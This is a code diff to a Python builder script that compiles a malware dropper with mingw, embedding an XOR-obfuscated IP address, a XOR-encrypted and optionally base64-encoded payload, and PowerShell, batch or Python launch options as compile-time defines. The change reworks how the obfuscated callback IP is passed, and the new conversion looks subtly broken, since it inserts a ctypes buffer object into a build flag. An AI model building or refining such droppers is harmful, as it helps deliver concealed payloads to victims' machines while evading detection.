@@ -1,3 +1,4 @@
+import ctypes
 import argparse
 import base64
 import hashlib
@@ -103,7 +104,7 @@ def parse_args() -> Args:
 	)
 
 # converts the release/debug and x86/x64 into a PE executable with mingw.
-def mingw_run(file_path: str, file_exe_path: str, dropper_write: str, configuration_bool: bool, arch: int, xor_key: int, base64: bool, output_file: str, dict_ext: dict[str, bool], ip:int, ip_xor:int, test_output: bool) -> int:
+def mingw_run(file_path: str, file_exe_path: str, dropper_write: str, configuration_bool: bool, arch: int, xor_key: int, base64: bool, output_file: str, dict_ext: dict[str, bool], ip: list[int], ip_xor:int, test_output: bool) -> int:
 
 
 	if (base64 == True):
@@ -129,6 +130,8 @@ def mingw_run(file_path: str, file_exe_path: str, dropper_write: str, configurat
 	print(f"This is your dropper write: {dropper_write!s}")
 	print(f"This is your ip: {ip!s}")
 
+	ip_cstring: ctypes.Array = convert_ip_to_cstring(ip)
+
 	if (configuration_bool == True):
 		success = subprocess.run([
 		mingw_version,
@@ -145,7 +148,7 @@ def mingw_run(file_path: str, file_exe_path: str, dropper_write: str, configurat
 		f'-DDROPPER_OUTPUT="{dropper_write}"',
 		f"-DDROPPER_XOR_KEY={xor_key!s}",
 		f"-DDROPPER_BASE64={base64_integer!s}",
-		f'-DIPADDR="{ip}"',
+		f'-DIPADDR="{ip_cstring}"',
 		f"-DIPXOR={ip_xor}",
 		f"-DPOWERSHELL={dict_ext['powershell']}",
 		f"-DBATCH={dict_ext['batch']}",
@@ -168,7 +171,7 @@ def mingw_run(file_path: str, file_exe_path: str, dropper_write: str, configurat
 		f'-DDROPPER_OUTPUT="{dropper_write}"',
 		f"-DDROPPER_XOR_KEY={xor_key!s}",
 		f"-DDROPPER_BASE64={base64_integer!s}",
-	        f'-DIPADDR="{ip}"',
+	        f'-DIPADDR="{ip_cstring}"',
 		f"-DIPXOR={ip_xor}",
 		f"-DPOWERSHELL={dict_ext['powershell']}",
 		f"-DBATCH={dict_ext['batch']}",
@@ -179,6 +182,9 @@ def mingw_run(file_path: str, file_exe_path: str, dropper_write: str, configurat
 	# 0 for success
 	return success.returncode
 
+def convert_ip_to_cstring(ip: list[int]) -> ctypes.Array:
+	ip_str: str = "".join([str(char) for char in ip])
+	return ctypes.create_string_buffer(ip_str.encode("utf-8"))
 
 #compile the rc file so it can be added with g++
 def rc_compile(arch: int, output_file: str, test_output: bool, resource: str) -> int:
@@ -335,8 +341,8 @@ def xor_file(payload_file: str, xor_key: int, log_message: str, logging_output: 
 
 	return log_message
 
-def xor_ip(ip: str, xor_key: int) -> int:
-	ip_ret: int  = [ord(char) ^ xor_key for char in ip]
+def xor_ip(ip: str, xor_key: int) -> list[int]:
+	ip_ret: list[int]  = [ord(char) ^ xor_key for char in ip]
 	return ip_ret
 
 def revise_args(args: Args) -> None:
@@ -536,7 +542,7 @@ def main() -> int:
 	file_ext_dict: dict[str, bool] = { "powershell": False, "batch": False, "python": False }
 
 	if (args.ip_xor_key != 0):
-		encrypted_ip: int = xor_ip(args.ip, args.ip_xor_key)
+		encrypted_ip: list[int] = xor_ip(args.ip, args.ip_xor_key)
 
 	for i in range(len(args.encode_list)):
 
